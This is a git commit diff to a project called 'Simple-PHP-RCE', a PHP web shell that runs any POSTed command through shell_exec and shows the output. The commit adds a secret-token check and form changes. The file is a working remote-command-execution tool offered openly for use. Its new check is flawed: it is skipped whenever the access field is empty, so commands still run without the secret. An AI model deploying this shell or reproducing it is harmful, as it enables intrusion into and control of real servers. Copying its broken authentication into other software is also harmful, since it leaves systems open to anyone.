63ca976e30be3ccf9b50a88bbe0467f93b71dfc8
rifqihz <rifqi977@gmail.com>
2023-09-23 23:08:57 +0700

    Add authentication key and verification

--- README.md
+++ README.md
@@ -1,2 +1,3 @@
 # Simple-PHP-RCE
 it's just simple remote php command execution
+(23/09/2023 Add Authentication Key and Verification)
--- simple_php_rce.php
+++ simple_php_rce.php
@@ -1,4 +1,12 @@
 <?php
+if (!empty($_POST['access'])) {
+    $access = htmlspecialchars($_POST['access'], ENT_QUOTES, 'UTF-8');
+    $secret = '<Enter Your Secret Here>'; // Insert your secret here
+    if($access !== $secret){
+        echo "Unauthorized Access";
+        exit(0);
+    }
+}
 if (!empty($_POST['cmd'])) {
     $cmd = shell_exec($_POST['cmd']);
 }
@@ -6,6 +14,7 @@ if (!empty($_POST['cmd'])) {
 <!DOCTYPE html>
 <html>
 <!-- By Artyum (https://github.com/artyuum) -->
+<!-- Updated by Rifqihz (https://github.com/rifqihz) -->
 <head>
 
     <meta charset="utf-8">
@@ -47,24 +56,23 @@ if (!empty($_POST['cmd'])) {
         <form method="POST">
             <div class="form-group">
                 <label for="cmd"><strong>Command</strong></label>
-                <input type="text" class="form-control" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>" required>
+                <input type="text" class="form-control" name="cmd" id="cmd" value="<?= !empty($cmd) ? htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') : '' ?>" placeholder="command" required>
+                <label for="access"><strong>Access Token    </strong></label>
+                <input type="text" class="form-control" name="access" id="access" value="<?= !empty($cmd) ? htmlspecialchars($_POST['access'], ENT_QUOTES, 'UTF-8') : '' ?>" placeholder="secret" required>
             </div>
             <button type="submit" class="btn btn-primary">Execute</button>
         </form>
 
-<?php if ($cmd): ?>
+
         <div class="pb-2 mt-4 mb-2">
             <h2> Output </h2>
+            <?php if (empty($cmd)): ?>
+                <pre><small>No result.</small></pre>
+            <?php elseif (!empty($cmd) && $_SERVER['REQUEST_METHOD'] == 'POST'): ?>
+                <pre><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre>
+            <?php endif; ?>        
+
         </div>
-        <pre>
-<?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?>
-        </pre>
-<?php elseif (!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'): ?>
-        <div class="pb-2 mt-4 mb-2">
-            <h2> Output </h2>
-        </div>
-        <pre><small>No result.</small></pre>
-<?php endif; ?>
     </div>
 
 </body>
